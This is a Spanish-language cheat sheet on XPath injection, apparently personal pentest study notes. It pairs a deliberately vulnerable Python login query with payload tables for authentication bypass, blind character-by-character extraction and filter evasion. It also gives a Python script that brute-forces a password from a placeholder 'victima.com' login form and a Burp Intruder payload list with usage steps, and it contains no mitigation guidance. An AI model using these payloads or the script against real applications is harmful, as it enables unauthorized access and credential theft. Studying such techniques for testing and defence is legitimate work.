
---
Tags:

---
## 📖 Definición

- [[XPath Injection]] (XPathi)** ocurre cuando una aplicación utiliza **consultas XPath** en documentos XML con datos controlados por el usuario sin la debida sanitización.
    
- Similar a **SQL Injection**, pero en lugar de atacar bases de datos SQL, se atacan **archivos XML**.
    
- Objetivo: **extraer datos, evadir autenticación, enumerar nodos XML**.
    

---

## 🔎 Ejemplo básico

Archivo XML de usuarios (`users.xml`):

```
<users>   
	<user>     
		<username>admin</username>     
		<password>admin123</password>   
	</user>   
	<user>     
		<username>marco</username>     
		<password>12345</password>   
	</user> 
</users>
```

Código vulnerable:


```Python
username = request.POST['username'] 
password = request.POST['password']  
query = f"//users/user[username/text()='{username}' and password/text()='{password}']" result = xml.xpath(query)
```
---

## 🎯 Payloads comunes

| Objetivo                         | Payload                                                |
| -------------------------------- | ------------------------------------------------------ |
| **Bypass login**                 | `' or '1'='1`                                          |
| **Bypass (numérico)**            | `1 or 1=1`                                             |
| **Enumerar nodos**               | `' or count(//user)=2 or '1'='0`                       |
| **Extraer longitud de un valor** | `' or string-length(//user[1]/password)=5 or '1'='0`   |
| **Extraer carácter específico**  | `' or substring(//user[1]/password,1,1)='a' or '1'='0` |
| **Listar nombres de etiquetas**  | `' or name(//user[1]/*[1])='username' or '1'='0`       |

---

# 📌 XPath Injection sin conocer etiquetas

Cuando no sabemos los nombres de las etiquetas, podemos usar índices y funciones de XPath para descubrirlas paso a paso.

---

## 🧭 Navegación básica por posiciones

|Payload XPath|Explicación|
|---|---|
|`/*`|Primer nodo raíz|
|`/*/*`|Todos los hijos del nodo raíz|
|`/*/*[1]`|Primer hijo del nodo raíz|
|`/*/*[2]`|Segundo hijo del nodo raíz|

---

## 🔍 Enumeración de nombres de etiquetas

|Payload XPath|Explicación|
|---|---|
|`name(/*/*[1])`|Devuelve el nombre del primer hijo|
|`name(/*/*[2])`|Devuelve el nombre del segundo hijo|
|`' or name(/*/*[1])='username' or '1'='0`|Comprueba si el primer hijo se llama `username`|
|`' or name(/*/*[2])='password' or '1'='0`|Comprueba si el segundo hijo se llama `password`|

---

## 📏 Descubrir longitud de nombres

|Payload XPath|Explicación|
|---|---|
|`string-length(name(/*/*[1]))=4`|Devuelve si el nombre del primer nodo tiene 4 caracteres|
|`' or string-length(name(/*/*[2]))>5 or '1'='0`|Verifica si el segundo nodo tiene un nombre de más de 5 caracteres|

---

## 🧩 Extraer nombres carácter a carácter

[¡!] Importante: Poner or antes de payload.

| Payload XPath                      | Explicación                                           |
| ---------------------------------- | ----------------------------------------------------- |
| `substring(name(/*/*[1]),1,1)='u'` | Comprueba si la primera letra del primer nodo es `u`  |
| `substring(name(/*/*[1]),2,1)='s'` | Comprueba si la segunda letra es `s`                  |
| `substring(name(/*/*[2]),1,1)='p'` | Comprueba si la primera letra del segundo nodo es `p` |

---

## 📦 Extraer valores de los nodos (sin nombres)

|Payload XPath|Explicación|
|---|---|
|`/*/*[1]`|Devuelve el contenido del primer hijo|
|`/*/*[2]`|Devuelve el contenido del segundo hijo|
|`substring(/*/*[1],1,1)='a'`|Comprueba si el primer carácter del valor del primer nodo es `a`|
|`substring(/*/*[2],1,1)='p'`|Comprueba si el primer carácter del valor del segundo nodo es `p`|

---

## 🛠 Estrategia paso a paso (Checklist) 

## 🧪 Técnicas de explotación

### 1. **Bypass de autenticación**

Consulta vulnerable:

`//users/user[username/text()='INPUT' and password/text()='INPUT']`

Payload:

`' or '1'='1`

Resultado → devuelve todos los usuarios.

---

### 2. **Error-Based**

Forzar errores con consultas no válidas:

`' or count(//user//*) or '`

Si cambia la respuesta → vulnerable.

---

### 3. **Blind (true/false)**

- Inyección booleana con condiciones que devuelven verdadero o falso.
    
- Ejemplo:
    

`' or substring(//user[1]/password,1,1)='a' or '1'='0`

Si la respuesta es distinta → el primer carácter es `a`.

---

### 4. **Enumeración de estructura**

- Nodos totales:
    

`' or count(//user) or '0`

- Nombre de etiqueta:
    

`' or name(//user[1]/*[1])='username' or '1'='0`

---

## 🛠️ Métodos de bypass

|Método|Ejemplo|
|---|---|
|**Null byte**|`%00`|
|**URL Encoding**|`%27%20or%20%271%27%3D%271`|
|**Base64 encoding (si endpoint decodifica)**|`JyBvciAnMSc9JzE=`|
|**Case variations**|`Or`, `oR`, `OR`|
|**Comentarios**|`' or '1'='1' (: comment :)`|

---

## 📜 Comparativa con SQL Injection

|Aspecto|SQL Injection|XPath Injection|
|---|---|---|
|**Lenguaje**|SQL|XPath|
|**Estructura**|Tablas y columnas|Nodos XML y atributos|
|**Bypass login**|`' OR '1'='1`|`' or '1'='1`|
|**Enumeración**|`UNION SELECT`, `LIMIT`, `ORDER BY`|`count()`, `name()`, `substring()`|
|**Extracción ciega**|`SUBSTRING()`, `LENGTH()`|`substring()`, `string-length()`|
|**Herramientas**|SQLMap, Havij, Burp Suite|Scripts en Python, Burp Intruder|

---

## 🤖 Script en Python para enumerar


```python
import requests  
url = "http://victima.com/login" 
charset = "abcdefghijklmnopqrstuvwxyz0123456789"  password = ""  
for i in range(1, 20):     
	for c in charset:         
		payload = f"' or substring(//user[1]/password,{i},1)='{c}' or '1'='0"         data = {"username": "admin", "password": payload}         
		r = requests.post(url, data=data)         
		if "Bienvenido" in r.text:  # Ajustar según respuesta             
			password += c             
			print(f"[+] Caracter encontrado: {c}")             
			break  

print(f"[+] Password completo: {password}")`
```
---

## 🚀 Resumen final

- **XPath Injection = SQLi en XML**.
    
- Funciona contra aplicaciones que usan XML en consultas.
    
- Técnicas:
    
    - Bypass login.
        
    - Error-based.
        
    - Blind.
        
    - Enumeración de nodos.
        
- Funciones clave: `substring()`, `string-length()`, `count()`, `name()`.
    
- **No hay XPathMap** → explotación suele ser manual o con scripts.

---
# 📑 XPath Injection – Cheat Sheet para Burp Intruder

## 🎯 Bypass de autenticación

`§' or '1'='1§ §' or '1'='1' or 'a'='a§ §' or not(0) or '1'='1§ §' or count(//user) > 0 or '1'='0§`

---

## 🧪 Enumeración de usuarios

```
§' or count(//user) = 1 or '1'='0§ 
§' or count(//user) = 2 or '1'='0§ 
§' or count(//user) = 3 or '1'='0§ 
§' or count(//user) = 4 or '1'='0§
```

---

## 🔍 Enumeración de etiquetas

```
§' or name(//user[1]/*[1])='username' or '1'='0§ 
§' or name(//user[1]/*[2])='password' or '1'='0§ 
§' or name(//user[2]/*[1])='username' or '1'='0§ 
§' or name(//user[2]/*[2])='password' or '1'='0§
```

---

## 🔑 Extracción de longitud de valores

```
§' or string-length(//user[1]/password)=1 or '1'='0§ 
§' or string-length(//user[1]/password)=2 or '1'='0§ 
§' or string-length(//user[1]/password)=3 or '1'='0§ 
§' or string-length(//user[1]/password)=4 or '1'='0§ 
§' or string-length(//user[1]/password)=5 or '1'='0§
```

---

## 🕵️ Extracción de valores carácter por carácter

```
§' or substring(//user[1]/password,1,1)='a' or '1'='0§ 
§' or substring(//user[1]/password,1,1)='b' or '1'='0§ 
§' or substring(//user[1]/password,1,1)='c' or '1'='0§ 
§' or substring(//user[1]/password,2,1)='a' or '1'='0§ 
§' or substring(//user[1]/password,2,1)='b' or '1'='0§ 
§' or substring(//user[1]/password,2,1)='c' or '1'='0§
```

---

## 🧩 Bypass y evasión de filtros

 ```
§' or '1'='1' (: comment :)§ 
§' Or '1'='1§ §' oR '1'='1§ §' OR '1'='1§ 
§%27%20or%20%271%27%3D%271§ 
§JyBvciAnMSc9JzE=§   <-- Base64 encoding de ' or '1'='1
```

---

## 🚀 Resumen de uso en Burp

1. Coloca los **marcadores `§`** en los parámetros vulnerables (ejemplo: `username=§test§`).
    
2. Pega esta **cheat sheet como lista de payloads** en Burp Intruder.
    
3. Selecciona ataque **Sniper** para testear uno por uno.
    
4. Identifica cambios en la respuesta (longitud, status code, contenido).